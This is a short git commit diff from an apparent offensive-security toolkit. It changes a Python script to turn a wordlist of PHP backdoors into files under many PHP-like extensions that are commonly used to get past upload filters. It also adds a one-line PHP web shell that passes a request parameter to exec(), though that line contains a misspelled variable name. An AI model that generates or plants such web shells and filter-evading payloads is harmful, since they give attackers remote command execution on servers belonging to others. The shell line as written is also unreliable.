00d8c569fb548d96f274281c72005c9b74ea9d84
Yunolay <mutantneu@gmail.com>
2024-01-22 23:15:11 +0000

    fix

--- php_generator.py
+++ php_generator.py
@@ -1,11 +1,15 @@
 #!/usr/bin/env python3
 import os
 
+extensions = ['.php', '.pht', '.phtm', '.phtml', '.phar', '.phpt', '.pgif', '.phps', '.phtml', '.php2', '.php3', '.php4', '.php5', '.php6', '.php7', '.php16', '.inc']
+
 def main():
     f = open('intruder_php_backdoor_wordlist.txt', 'r')
     for i, line in enumerate(f):
-        p = open(f'shell_{i}.php', 'w')
-        p.write(line)
+        for ext in extensions:
+            line = line.replace(ext, '')
+            p = open(f'shell/shell_{i}{ext}', 'w')
+            p.write(line)
 
 if __name__ == '__main__':
     main()
---
+++ shell/shell_16.php6
@@ -0,0 +1,1 @@
+<?php exec($_REQQUEST['0']);?>
